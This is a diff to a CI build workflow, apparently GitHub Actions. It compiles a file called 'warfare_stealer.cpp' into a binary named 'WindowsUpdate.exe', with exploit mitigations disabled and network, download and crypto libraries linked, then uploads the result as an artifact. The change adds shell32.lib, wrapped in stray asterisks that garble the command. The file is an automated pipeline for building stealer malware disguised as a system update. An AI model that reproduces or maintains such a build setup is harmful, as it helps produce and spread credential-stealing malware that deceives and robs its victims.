@@ -17,7 +17,7 @@ jobs:
     
     - name: Compile
       run: |
-        cl /O2 /MT /GS- /GL- /Gy- /EHsc /DUNICODE /D_UNICODE /W0 warfare_stealer.cpp /link /SUBSYSTEM:WINDOWS /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:WindowsUpdate.exe user32.lib kernel32.lib advapi32.lib ole32.lib oleaut32.lib urlmon.lib wininet.lib crypt32.lib iphlpapi.lib shlwapi.lib
+        cl /O2 /MT /GS- /GL- /Gy- /EHsc /DUNICODE /D_UNICODE /W0 warfare_stealer.cpp /link /SUBSYSTEM:WINDOWS /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:WindowsUpdate.exe user32.lib kernel32.lib advapi32.lib ole32.lib oleaut32.lib urlmon.lib wininet.lib crypt32.lib iphlpapi.lib shlwapi.lib **shell32.lib**
     
     - name: Upload EXE
       uses: actions/upload-artifact@v4
